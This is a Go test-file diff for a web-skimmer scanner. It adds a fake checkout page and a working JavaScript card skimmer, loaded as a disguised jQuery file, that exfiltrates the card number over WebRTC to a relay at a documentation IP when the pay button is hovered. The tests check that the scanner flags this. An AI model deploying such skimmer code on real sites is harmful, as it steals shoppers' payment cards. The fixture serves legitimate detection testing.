@@ -136,3 +136,86 @@ func TestLeakedCanaryEncodings(t *testing.T) {
 		}
 	}
 }
+
+// A PaperCut-style skimmer: it waits for the pointer to reach the pay button, then sends the
+// card over a WebRTC data channel to a relay at a bare IP. No HTTP request ever carries the
+// card, so only the WebRTC instrumentation and the hover can catch it. 198.51.100.7 is a
+// documentation address (TEST-NET-2) that routes nowhere.
+const webrtcCheckout = `<!doctype html><html><body>
+<form id="pay"><input name="cardnumber" autocomplete="cc-number"><input name="cvv" autocomplete="cc-csc">
+<button type="submit" id="go">Pagar</button></form>
+<script src="/static/jQuery.1.3.1.js"></script></body></html>`
+
+const webrtcSkimmer = `(function(){
+  var armed = false;
+  document.getElementById("go").addEventListener("mouseover", function(){
+    if (armed) return; armed = true;
+    var pc = new RTCPeerConnection({iceServers: [{urls: "turn:198.51.100.7:40000", username: "u", credential: "p"}]});
+    var dc = pc.createDataChannel("x");
+    var card = document.querySelector('input[name="cardnumber"]').value;
+    try { dc.send(JSON.stringify({c: card})); } catch (e) {}
+    window.__fired = true;
+  });
+})();`
+
+func TestWebRTCSkimmerCaughtOnHover(t *testing.T) {
+	path := chromePath(t)
+	store := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if strings.HasSuffix(r.URL.Path, ".js") {
+			w.Header().Set("Content-Type", "application/javascript")
+			io.WriteString(w, webrtcSkimmer)
+			return
+		}
+		w.Header().Set("Content-Type", "text/html")
+		io.WriteString(w, webrtcCheckout)
+	}))
+	defer store.Close()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
+	defer cancel()
+	b, err := NewBrowser(ctx, BrowserOptions{ExecPath: path, UserAgent: "skimwatch-test", NoSandbox: true, NoProxy: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer b.Close()
+
+	res, err := b.Visit(ctx, store.URL+"/checkout", 1500*time.Millisecond)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if res.Hovered == 0 || res.CardFields == 0 {
+		t.Fatalf("want the pay button hovered and card fields counted, got hovered=%d card=%d", res.Hovered, res.CardFields)
+	}
+	if len(res.WebRTCPeers) != 1 || res.WebRTCPeers[0] != "198.51.100.7" {
+		t.Errorf("want the relay IP as a WebRTC peer, got %v", res.WebRTCPeers)
+	}
+	got := map[string]model.Finding{}
+	for _, f := range Analyze(res, "test", domains.NewScope([]string{store.URL}, nil)) {
+		got[f.Rule] = f
+	}
+	if f, ok := got["canary-webrtc"]; !ok || f.Severity != model.Critical {
+		t.Fatalf("expected a critical WebRTC canary leak, got %+v", got)
+	} else if !strings.Contains(f.Location, "jQuery.1.3.1.js") {
+		t.Errorf("leak should be attributed to the fake jQuery, got %q", f.Location)
+	}
+	if got["webrtc-peer-external"].Severity != model.High {
+		t.Errorf("unknown relay on a card page should be high, got %+v", got["webrtc-peer-external"])
+	}
+	for _, f := range got {
+		if f.Rule == "api-replaced" && strings.Contains(f.Location, "RTC") {
+			t.Error("the scanner's own WebRTC hooks must not be reported as page tampering")
+		}
+	}
+}
+
+func TestWebRTCPeers(t *testing.T) {
+	events := []Event{
+		{Kind: "webrtc-peer", Detail: `[{"urls":"stun:stun.l.google.com:19302"},{"urls":["turn:89.116.171.109:40000?transport=udp"]}]`},
+		{Kind: "webrtc-remote", Detail: "v=0\r\nc=IN IP4 89.117.134.66\r\na=candidate:1 1 udp 2122260223 89.117.134.66 40000 typ host\r\n" +
+			"a=candidate:2 1 udp 2122260223 abcd-1234.local 50000 typ host\r\na=candidate:3 1 udp 1 192.168.1.4 1 typ host"},
+	}
+	got := strings.Join(webrtcPeers(events), ",")
+	if got != "stun.l.google.com,89.116.171.109,89.117.134.66" {
+		t.Errorf("got %s", got)
+	}
+}
